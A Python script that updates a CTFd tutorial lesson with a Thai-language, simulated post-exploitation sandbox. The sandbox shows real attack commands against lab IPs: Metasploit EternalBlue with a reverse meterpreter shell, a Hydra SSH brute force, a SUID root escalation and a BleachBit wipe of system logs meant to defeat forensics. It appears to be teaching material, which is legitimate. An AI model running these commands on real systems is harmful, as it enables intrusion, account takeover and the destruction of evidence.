import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

l176 = db.session.query(TutorialLesson).filter_by(id=176).first()
blocks = json.loads(l176.content)

# ─── Replace Block 1 with Clean Compressed Sandbox HTML (No comments, No blank lines, No broken tags) ───
blocks[1]['value'] = """### 💻 Post-Exploitation Coding Sandbox (จำลองคำสั่งยึดสิทธิ์และล้างล็อกระบบ)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาตัวอย่างเครื่องมือวิเคราะห์ระบบ และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลลัพธ์ผ่านเทอร์มินัลระบบ:

<style>
.w-sandbox-main{display:flex;gap:20px;margin:2rem auto;max-width:1050px;}
@media(max-width:820px){.w-sandbox-main{flex-direction:column;}}
.w-sandbox-nav{width:220px;display:flex;flex-direction:column;gap:6px;flex-shrink:0;}
@media(max-width:820px){.w-sandbox-nav{width:100%;flex-direction:row;flex-wrap:wrap;}}
.w-nav-item{padding:8px 12px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.04);border-radius:6px;font-size:0.75rem;color:#cbd5e1;cursor:pointer;text-align:left;transition:all 0.15s ease;}
.w-nav-item:hover, .w-nav-item.active{border-color:#ef4444;color:#ffffff;background:rgba(239,68,68,0.04);}
.w-nav-item.active{font-weight:bold;box-shadow:0 0 8px rgba(239,68,68,0.15);}
.w-sandbox-panels{flex:1;display:flex;flex-direction:column;gap:14px;}
.w-sand-panel{display:none;background:#05070f;border:1px solid rgba(255, 255, 255, 0.08);border-radius:10px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.45);box-sizing:border-box;}
.w-sand-panel.active{display:block !important;}
.w-sand-hdr{font-size:0.95rem;font-weight:800;color:#ffffff;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:10px;margin-bottom:14px;display:flex;justify-content:between;align-items:center;}
.w-sand-hdr span.tag{font-size:0.65rem;padding:2px 8px;border-radius:4px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);color:#ef4444;font-family:'JetBrains Mono',monospace;}
.w-sand-code{font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:#ef4444;white-space:pre-wrap;margin:0 0 12px;background:rgba(0,0,0,0.2);padding:14px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);}
.w-sand-term-container{position:relative;background:#02040a;border:1px solid rgba(255,255,255,0.06);border-radius:8px;margin-bottom:16px;box-shadow:inset 0 2px 8px rgba(0,0,0,0.9);overflow:hidden;}
.w-sand-term-bar{background:rgba(255,255,255,0.03);padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;}
.w-sand-term-title{font-size:0.65rem;color:#64748b;font-weight:800;letter-spacing:0.06em;font-family:'JetBrains Mono',monospace;}
.w-sand-term-btn{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:4px;color:#ef4444;font-size:0.68rem;padding:3px 8px;cursor:pointer;font-family:'JetBrains Mono',monospace;font-weight:700;transition:all 0.15s ease;display:flex;align-items:center;gap:4px;}
.w-sand-term-btn:hover{background:#ef4444;color:#02040a;box-shadow:0 0 8px rgba(239,68,68,0.4);}
.w-sand-term{font-family:'JetBrains Mono',monospace;font-size:0.76rem;color:#a7f3d0;padding:12px 16px;white-space:pre-wrap;min-height:90px;}
.w-sand-term span.prompt{color:#3ddc84;}
.w-sand-term span.cmd{color:#ffffff;font-weight:bold;}
.w-sand-expl{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:16px;font-size:0.83rem;color:#cbd5e1;line-height:1.65;}
.w-sand-expl h5{margin:0 0 8px;font-size:0.85rem;color:#fbbf24;font-weight:bold;}
.w-sand-expl p{margin:0 0 10px;}
.w-sand-expl p:last-child{margin-bottom:0;}
</style>
<div class="w-sandbox-main"><div class="w-sandbox-nav"><button id="nav-item-msfconsole" class="w-nav-item active" onclick="showSandboxItem('msfconsole', this)">1. Metasploit Attack Handler</button><button id="nav-item-searchsploit" class="w-nav-item" onclick="showSandboxItem('searchsploit', this)">2. SearchSploit offline lookup</button><button id="nav-item-hydra" class="w-nav-item" onclick="showSandboxItem('hydra', this)">3. Hydra SSH brute-force</button><button id="nav-item-suid" class="w-nav-item" onclick="showSandboxItem('suid', this)">4. Linux SUID Privilege Esc.</button><button id="nav-item-bleachbit" class="w-nav-item" onclick="showSandboxItem('bleachbit', this)">5. BleachBit log cleanup</button></div><div class="w-sandbox-panels"><div id="panel-msfconsole" class="w-sand-panel"><div class="w-sand-hdr"><span>1. Metasploit console execution</span> <span class="tag">Metasploit</span></div><pre class="w-sand-code">use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.19.19.129
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.19.19.200
exploit</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startPostSim('msfconsole')">▶ Run Simulation</button></div><div id="term-msfconsole" class="w-sand-term"><span class="prompt">msf6 &gt;</span> [กดปุ่ม Run Simulation เพื่อจำลองคอมมานด์]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>การโจมตีเป้าหมายเพื่อฝัง Meterpreter payload หากเจาะสำเร็จจะได้รับสิทธิ์ควบคุมเครื่องเป้าหมายในโหมดแอนตี้ฟอเรนสิกส์</p></div></div><div id="panel-searchsploit" class="w-sand-panel"><div class="w-sand-hdr"><span>2. SearchSploit Offline Query</span> <span class="tag">Linux CLI</span></div><pre class="w-sand-code">searchsploit CVE-2021-44228</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startPostSim('searchsploit')">▶ Run Simulation</button></div><div id="term-searchsploit" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองคำสั่ง]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>SearchSploit สแกนค้นหาซอร์สโค้ดไฟล์ PoC ของช่องโหว่ความปลอดภัยที่จัดเก็บไว้ในฐานข้อมูลออฟไลน์โดยไม่ต้องเปิดต่อเน็ต</p></div></div><div id="panel-hydra" class="w-sand-panel"><div class="w-sand-hdr"><span>3. Hydra SSH Credentials Guessing</span> <span class="tag">Linux CLI</span></div><pre class="w-sand-code">hydra -l root -P rockyou.txt 172.19.19.129 ssh</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startPostSim('hydra')">▶ Run Simulation</button></div><div id="term-hydra" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองการยิงรหัส]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>Hydra ดำเนินการล็อกอินยิงรหัสผ่านสุ่มแบบคู่ขนานประสิทธิผลสูง กวาดหาคีย์ผ่าน Wordlist rockyou</p></div></div><div id="panel-suid" class="w-sand-panel"><div class="w-sand-hdr"><span>4. Linux SUID Privilege Escalation</span> <span class="tag">Linux CLI</span></div><pre class="w-sand-code">find / -perm -4000 -type f 2>/dev/null</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startPostSim('suid')">▶ Run Simulation</button></div><div id="term-suid" class="w-sand-term"><span class="prompt">victim@ubuntu:~$</span> [กดปุ่ม Run Simulation เพื่อจำลองตรรกะเจาะสิทธิ์]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>หากพบไฟล์ระบบที่เปิดสิทธิ์ SUID ไว้เกินจำเป็น (เช่น find) จะสามารถสั่งเปิดสิทธิ์ shell ในระดับ root ได้ทันที</p></div></div><div id="panel-bleachbit" class="w-sand-panel"><div class="w-sand-hdr"><span>5. BleachBit log cleanup</span> <span class="tag">Linux CLI</span></div><pre class="w-sand-code">bleachbit --clean system.logs system.tmp</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startPostSim('bleachbit')">▶ Run Simulation</button></div><div id="term-bleachbit" class="w-sand-term"><span class="prompt">root@kali:~#</span> [กดปุ่ม Run Simulation เพื่อจำลองคำสั่ง]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>BleachBit สั่งลบไฟล์ขยะและระบบ Log ในสิทธิแอนตี้ฟอเรนสิกส์ ป้องกันผู้ดูแลเครื่องสืบพิกัดกลับ</p></div></div></div></div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => {
    p.style.setProperty('display', 'none', 'important');
  });
  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) {
    targetPanel.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);
window.startPostSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">Processing exploit/persistence vector...</span>\\n[.] Packaging shellcode\\n[.] Executing exploit...';
  setTimeout(() => {
    if (itemKey === 'msfconsole') {
      term.innerHTML = '<span class="prompt">msf6 &gt;</span> <span class="cmd">exploit</span>\\n[*] Started reverse TCP handler on 172.19.19.200:4444\\n[*] Sending Stage (200262 bytes) to 172.19.19.129\\n[*] <span style="color:#3ddc84; font-weight:bold;">Meterpreter session 1 opened (172.19.19.200:4444 -&gt; 172.19.19.129:49156)</span>\\n\\nmeterpreter &gt; <span style="color:#00f0ff;">getuid</span>\\nServer username: <span style="color:#3ddc84; font-weight:bold;">NT AUTHORITY\\\\SYSTEM</span>';
    } else if (itemKey === 'searchsploit') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">searchsploit CVE-2021-44228</span>\\n------------------------------------------------------------------------\\n Exploit Title                                           |  Path\\n------------------------------------------------------------------------\\n Apache Log4j2 2.14.1 - Remote Code Execution (RCE) PoC  | java/webapps/50592.txt\\n------------------------------------------------------------------------\\nShellcodes: No Results';
    } else if (itemKey === 'hydra') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">hydra -l root -P rockyou.txt 172.19.19.129 ssh</span>\\nHydra v9.2 (c) 2021 by van Hauser/THC - Playlist activated\\n[DATA] attacking ssh://172.19.19.129:22/\\n[22][ssh] host: 172.19.19.129 login: <span style="color:#3ddc84; font-weight:bold;">root</span> password: <span style="color:#3ddc84; font-weight:bold;">password123</span>\\n1 of 1 target successfully completed, 1 valid password found';
    } else if (itemKey === 'suid') {
      term.innerHTML = '<span class="prompt">victim@ubuntu:~$</span> <span class="cmd">find . -exec /bin/sh -p \\;</span>\\n# <span style="color:#3ddc84; font-weight:bold;">whoami</span>\\n<span style="color:#3ddc84; font-weight:bold;">root</span>\\n# [+] SUID Privilege Escalation succeeded!';
    } else if (itemKey === 'bleachbit') {
      term.innerHTML = '<span class="prompt">root@kali:~#</span> <span class="cmd">bleachbit --clean system.logs</span>\\nDelete 42.1kB /var/log/syslog\\nDelete 12.5kB /var/log/auth.log\\nDisk space recovered: 54.6kB';
    }
  }, 1000);
}
</script>"""

l176.content = json.dumps(blocks, ensure_ascii=False)
db.session.query(TutorialLesson).filter_by(id=176).update({"content": l176.content})
db.session.commit()
print("Lesson 176 Block 1 Sandbox successfully fixed and cleaned!")
ctx.pop()
